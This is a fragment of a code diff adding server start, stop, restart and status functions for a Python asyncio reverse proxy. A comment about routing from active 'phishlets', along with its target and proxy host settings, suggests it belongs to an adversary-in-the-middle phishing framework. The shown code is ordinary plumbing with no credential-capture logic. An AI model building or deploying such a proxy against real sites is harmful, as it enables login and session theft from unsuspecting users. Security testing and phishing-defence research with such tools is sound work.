+        except Exception as e:
+            debug_log(f"Error during cleanup: {e}", "ERROR")
+        _status.update({"running": False})
+        debug_log("=== PROXY SERVER STOPPED ===", "INFO")
+
+
+def start_proxy_server(port: Optional[int] = None,
+                       *,
+                       target_host: Optional[str] = None,
+                       proxy_host: Optional[str] = None,
+                       cert_file: Optional[str] = None,
+                       key_file: Optional[str] = None) -> Dict[str, Any]:
+    global _server_thread, _loop, _stop_event, TARGET_HOST, PROXY_HOST, PROXY_PORT, CERT_FILE, KEY_FILE
+    
+    debug_log("=== STARTING PROXY SERVER ===", "INFO")
+    debug_log(f"Requested port: {port}", "DEBUG")
+    debug_log(f"Requested target_host: {target_host}", "DEBUG")
+    debug_log(f"Requested proxy_host: {proxy_host}", "DEBUG")
+    debug_log(f"Requested cert_file: {cert_file}", "DEBUG")
+    debug_log(f"Requested key_file: {key_file}", "DEBUG")
+    
+    # If explicit hosts are not provided, we will rely on routing built from all active phishlets
+
+    # Apply explicit overrides if provided
+    if target_host:
+        TARGET_HOST = target_host
+        debug_log(f"Set TARGET_HOST to: {target_host}", "INFO")
+    if proxy_host:
+        PROXY_HOST = proxy_host
+        debug_log(f"Set PROXY_HOST to: {proxy_host}", "INFO")
+    if cert_file:
+        CERT_FILE = cert_file
+        debug_log(f"Set CERT_FILE to: {cert_file}", "INFO")
+    if key_file:
+        KEY_FILE = key_file
+        debug_log(f"Set KEY_FILE to: {key_file}", "INFO")
+    if port is not None:
+        PROXY_PORT = int(port)
+        debug_log(f"Set PROXY_PORT to: {PROXY_PORT}", "INFO")
+
+    if _server_thread and _server_thread.is_alive():
+        debug_log("Proxy already running, returning current status", "WARN")
+        return {"ok": True, "message": "Proxy already running.", "status": get_proxy_status()}
+
+    debug_log("Creating stop event and server thread", "DEBUG")
+    _stop_event = threading.Event()
+
+    def _thread_target():
+        global _loop
+        debug_log("Server thread starting...", "INFO")
+        _loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(_loop)
+        try:
+            debug_log("Running server event loop", "DEBUG")
+            _loop.run_until_complete(_start_and_wait(_stop_event, port=PROXY_PORT))
+        except Exception as e:
+            debug_log(f"Server thread error: {e}", "ERROR")
+            debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+        finally:
+            try:
+                debug_log("Stopping server event loop", "DEBUG")
+                _loop.stop()
+            except Exception as e:
+                debug_log(f"Error stopping loop: {e}", "WARN")
+            try:
+                _loop.close()
+                debug_log("Server event loop closed", "DEBUG")
+            except Exception as e:
+                debug_log(f"Error closing loop: {e}", "WARN")
+            debug_log("Server thread exiting", "INFO")
+
+    _server_thread = threading.Thread(target=_thread_target, name='http-proxy', daemon=True)
+    debug_log("Starting server thread", "INFO")
+    _server_thread.start()
+    
+    # Wait a moment for the server to start
+    time.sleep(0.1)
+    status = get_proxy_status()
+    debug_log(f"Server startup complete. Status: {status}", "INFO")
+    
+    return {"ok": True, "message": "Proxy starting.", "status": status}
+
+
+def stop_proxy_server() -> Dict[str, Any]:
+    global _stop_event, _server_thread
+    
+    debug_log("=== STOPPING PROXY SERVER ===", "INFO")
+    
+    if not (_server_thread and _server_thread.is_alive()):
+        debug_log("Proxy not running, nothing to stop", "WARN")
+        return {"ok": True, "message": "Proxy not running.", "status": get_proxy_status()}
+    
+    debug_log("Setting stop event", "INFO")
+    if _stop_event:
+        _stop_event.set()
+    
+    debug_log("Waiting for server thread to join (timeout: 3s)", "INFO")
+    _server_thread.join(timeout=3.0)
+    
+    if _server_thread.is_alive():
+        debug_log("Server thread did not stop within timeout", "WARN")
+    else:
+        debug_log("Server thread stopped successfully", "INFO")
+    
+    status = get_proxy_status()
+    debug_log(f"Stop complete. Final status: {status}", "INFO")
+    return {"ok": True, "message": "Proxy stopped.", "status": status}
+
+
+def restart_proxy_server(port: Optional[int] = None) -> Dict[str, Any]:
+    debug_log("=== RESTARTING PROXY SERVER ===", "INFO")
+    debug_log(f"Requested port: {port}", "DEBUG")
+    
+    current_status = get_proxy_status()
+    debug_log(f"Current status: {current_status}", "DEBUG")
+    
+    if current_status.get("running"):
+        debug_log("Stopping existing server...", "INFO")
+        stop_result = stop_proxy_server()
+        debug_log(f"Stop result: {stop_result}", "DEBUG")
+        
+        # Give it a moment to fully stop
+        time.sleep(0.5)
+    else:
+        debug_log("No running server to stop", "INFO")
+    
+    debug_log("Starting new server...", "INFO")
+    start_result = start_proxy_server(port or PROXY_PORT)
+    debug_log(f"Start result: {start_result}", "DEBUG")
+    
+    return start_result
+
+
+def get_proxy_status() -> Dict[str, Any]:
+    return {"running": bool(_server_thread and _server_thread.is_alive() and _status.get("running")),
+            "port": _status.get("port") or PROXY_PORT,
+            "scheme": _status.get("scheme") or ("HTTPS" if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE) else "HTTP"),
+            "error": _status.get("error")}
+
+
+async def main():
+    # CLI entrypoint: start and block until Ctrl+C
+    stop_evt = threading.Event()
+    try:
+        await _start_and_wait(stop_evt, port=PROXY_PORT)
+    except KeyboardInterrupt:
+        stop_evt.set()
+
+
+def create_proxy_session(proxy_config: dict) -> ClientSession:
+    """
+    Create a ClientSession with proxy configuration.
+    
+    Args:
+        proxy_config: Dictionary containing proxy configuration with keys:
+            - type: proxy type (http, https, socks4, socks5)
+            - host: proxy hostname
+            - port: proxy port
+            - username: proxy username (optional)
+            - password: proxy password (optional)
+            - url: full proxy URL
+    
+    Returns:
+        ClientSession configured with the proxy
+    """
+    if not proxy_config:
+        return ClientSession()
+    
+    # For now, we'll support HTTP and HTTPS proxies
+    # SOCKS support would require additional dependencies
+    if proxy_config['type'] in ['http', 'https']:
+        proxy_url = proxy_config['url']
+        debug_log(f"Creating ClientSession with proxy: {proxy_url}", "INFO")
+        
+        # For aiohttp, we need to pass the proxy URL in the request method
+        # The session itself doesn't have proxy configuration, it's per-request
+        # So we'll create a regular session and handle proxy in the request
+        return ClientSession()
+    else:
+        debug_log(f"Unsupported proxy type: {proxy_config['type']}, using direct connection", "WARN")
+        return ClientSession()
+
+
+if __name__ == '__main__':
+    asyncio.run(main())
+
+
